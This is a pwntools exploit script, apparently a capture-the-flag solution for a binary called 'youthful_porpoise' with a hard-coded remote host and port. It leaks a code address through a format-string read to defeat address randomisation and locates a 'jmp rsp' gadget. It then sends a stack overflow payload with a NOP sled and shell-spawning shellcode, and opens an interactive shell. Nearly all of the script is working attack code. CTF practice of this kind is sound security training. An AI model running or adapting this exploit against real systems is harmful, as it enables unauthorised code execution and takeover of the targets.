from pwn import *

"""
Initial Setup
"""

elf = ELF("./youthful_porpoise")
HOST, PORT = '92.222.72.208', 5004
arch = "amd64"

context.binary = elf
context.arch = arch
context.terminal = ['tmux','splitw','-h']
p = None

convert = lambda x                  :x if type(x)==bytes else str(x).encode()
s       = lambda data               :p.send(convert(data))
sl      = lambda data               :p.sendline(convert(data))
sla     = lambda delim,data         :p.sendlineafter(convert(delim), convert(data), timeout=context.timeout)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop, timeout=context.timeout)
r       = lambda n                  :p.recv(n)
rl      = lambda                    :p.recvline()

gdbscript = '''

'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gdbscript)
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(elf.path)

p = start()


"""
Script Goes Here
"""
# Send initial menu input (if needed)
sl(b"1")                                 # Assuming a menu prompt with option "1"
sl(b"%23$p")

ru(b"> ")
main = int(rl().split(b", ")[1].strip(), 16)
elf.address = main - elf.sym.main
print(hex(elf.address))

# Gadgets and addresses
jmp_rsp = asm('jmp rsp')
jmp_rsp = next(elf.search(jmp_rsp))

# Build payload
payload = asm('nop') * 72                # Padding to RIP
payload += p64(jmp_rsp)                  # Overwrite RIP → jmp rsp
payload += asm('nop') * 16               # NOP sled
payload += asm(shellcraft.sh())          # Shellcode

# Send initial menu input (if needed)
sl(b"1")

# Send the exploit payload
sl(payload)

# Get interactive shell
p.interactive()
